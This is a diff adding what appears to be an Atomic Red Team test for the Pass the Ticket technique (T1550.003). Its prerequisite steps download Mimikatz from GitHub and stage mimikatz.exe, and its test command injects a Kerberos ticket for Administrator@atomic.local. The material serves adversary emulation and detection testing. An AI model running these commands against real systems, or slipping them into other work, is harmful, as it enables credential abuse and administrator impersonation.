@@ -1,0 +1,19 @@
+#TechniqueName: Use Alternate Authentication Material: Pass the Ticket
+#AtomicTestName: Mimikatz Kerberos Ticket Attack
+#Language: cmd
+
+#get_prereq_commands
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
+New-Item -ItemType Directory (Split-Path PathToAtomicsFolder\T1550.003\bin\mimikatz.exe) -Force | Out-Null
+Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe PathToAtomicsFolder\T1550.003\bin\mimikatz.exe -Force
+
+
+#prereq_commands
+if (Test-Path PathToAtomicsFolder\T1550.003\bin\mimikatz.exe) {exit 0} else {exit 1}
+
+
+#commands
+PathToAtomicsFolder\T1550.003\bin\mimikatz.exe # kerberos::ptt Administrator@atomic.local
+
